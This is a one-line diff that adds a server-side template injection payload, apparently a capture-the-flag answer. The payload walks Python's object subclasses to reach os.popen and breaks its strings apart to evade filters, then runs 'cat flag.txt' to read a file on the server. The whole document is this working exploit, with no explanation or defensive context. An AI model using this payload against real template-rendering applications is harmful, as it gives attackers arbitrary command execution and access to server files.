@@ -1,0 +1,1 @@
+{{''['__cla'+'ss__'].__base__['__subcla'+'sses__']()[132].__init__.__globals__["po"+"pen"]("cat"+" fla"+"g.txt").read()}}
